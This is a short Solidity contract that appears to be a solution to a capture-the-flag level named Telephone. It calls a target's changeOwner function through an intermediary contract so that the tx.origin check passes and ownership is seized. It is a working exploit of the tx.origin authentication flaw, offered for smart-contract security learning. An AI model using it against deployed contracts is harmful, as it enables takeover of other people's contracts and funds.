// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract AttackTelephone {
    ITelephone telephone;

    constructor(ITelephone _telephone) public {
        telephone = _telephone;
    }

    // tx.origin = user
    // msg.sender = AttackTelephone's address
    function attack(address _owner) public {
        telephone.changeOwner(_owner);
    }
}